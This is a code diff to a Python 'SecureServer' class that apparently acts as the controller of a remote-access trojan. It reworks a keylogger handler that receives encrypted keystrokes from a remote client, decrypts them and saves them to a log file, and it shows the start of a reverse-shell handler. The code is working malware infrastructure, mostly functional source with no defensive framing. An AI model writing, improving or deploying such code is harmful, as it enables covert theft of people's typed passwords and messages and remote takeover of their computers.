@@ -33,6 +33,7 @@ class SecureServer:
     def start(self):
         """Start the secure server."""
         server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
         server.bind((self.server_ip, self.server_port))
         server.listen(1)
 
@@ -40,56 +41,62 @@ class SecureServer:
         print(f"Server listening on {self.server_ip}:{self.server_port}...")
 
     def keyLogger(self, client):
-        """Handles keylogging data from the client."""
-        print("Starting keylogger session...")
-        self.stop_logging = False
-        
-        def stop_listener():
-            while True:
-                command = input("Enter 'stop' to stop: ")
-                if command == "stop":
-                    self.stop_logging = True
-                    print("Stopping keylogger session...")
-                    with open("keylogs.txt", "r") as p:
-                      logs = p.read()
-                      print(logs) 
-                    return
+      """Handles keylogging data from the client."""
+      print("Starting keylogger session...")
+      self.stop_logging = False
 
-        threading.Thread(target=stop_listener, daemon=True).start()
-        
-        
-        if os.path.exists("keylogs.txt") or os.stat("keylogs.txt").st_size == 0:
-          with open("keylogs.txt","w") as file:
-            file.write("")
-            file.flush()
-
-        with open("keylogs.txt", "a") as keyLogs:
-            while not self.stop_logging:
-                try:
-                    client.settimeout(2)
-                    data = client.recv(1024)
-                    if not data:
-                         break
+      # Function to listen for stop command
+      def stop_listener():
+          while True:
+              command = input("Enter 'stop' to stop: ")
+              if command == "stop":
+                  self.stop_logging = True
+                  client.send(command.encode())
+                  print("Stopping keylogger session...")
                 
-                    decrypted_data = self.cipher.decrypt(data).decode()
-                    decrypted_data = str(decrypted_data).replace("'", "")
+                  if os.path.exists("keylogs.txt"):
+                      with open("keylogs.txt", "r") as p:
+                          logs = p.read()
+                          print("\nCaptured Keystrokes:\n", logs)
+                  else:
+                      print("No Key Logs found.")
+                  return
 
-                    if decrypted_data == "Key.enter":
-                        decrypted_data = "\n"
-                    elif decrypted_data == "Key.space":
-                        decrypted_data = " "
-                    elif decrypted_data in ["Key.shift", "Key.ctrl"]:
-                        decrypted_data = ""
-                    keyLogs.write(decrypted_data)
-                    keyLogs.flush()
-                    
-                except socket.timeout:
-                    continue
-                    
-                except Exception as e:
-                    print(f"Decryption failed: {e}")
-                    break
-            return
+      threading.Thread(target=stop_listener, daemon=True).start()
+
+      if os.path.exists("keylogs.txt"):
+          open("keylogs.txt", "w").close()
+
+      # Start keylogging
+      with open("keylogs.txt", "a") as keyLogs:
+          while not self.stop_logging:
+              try:
+                  client.settimeout(5)  
+                  data = client.recv(1024)
+                  if not data:
+                      break
+
+                  decrypted_data = self.cipher.decrypt(data).decode()
+                  decrypted_data = decrypted_data.replace("'", "")
+
+                  if decrypted_data == "Key.enter":
+                      decrypted_data = "\n"
+                  elif decrypted_data == "Key.space":
+                      decrypted_data = " "
+                  elif decrypted_data in ["Key.shift", "Key.ctrl"]:
+                      decrypted_data = ""
+
+                  keyLogs.write(decrypted_data)
+                  keyLogs.flush()
+
+              except socket.timeout:
+                  continue  
+              except Exception as e:
+                  print(f"Decryption failed: {e}")
+                  break
+
+      client.settimeout(None)  
+      return
 
     def reverseShell(self, client):
         """Handles reverse shell connection from the client."""
